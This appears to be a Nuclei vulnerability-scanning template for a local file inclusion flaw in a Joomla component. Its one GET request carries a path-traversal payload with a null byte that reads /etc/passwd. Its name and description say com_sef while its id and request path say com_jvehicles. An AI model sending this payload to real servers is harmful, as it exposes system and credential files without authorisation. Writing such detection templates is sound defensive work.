id: joomla-jvehicles-lfi

info:
  name: Joomla! Component com_sef - 本地文件包含漏洞
  author: daffainfo
  severity: high
  description: Joomla! Component com_sef - 本地文件包含 存在本地文件包含漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Upgrade to the latest version to mitigate this vulnerability。
    - 修复路径拼接与文件访问控制逻辑，禁止用户输入直接决定本地文件路径。
    - 收敛 Web 进程对敏感目录的读取权限，并对关键配置文件实施访问隔离。
  reference:
    - https://www.exploit-db.com/exploits/11997
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-23
  metadata:
    max-request: 1
  tags: joomla,lfi,edb,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
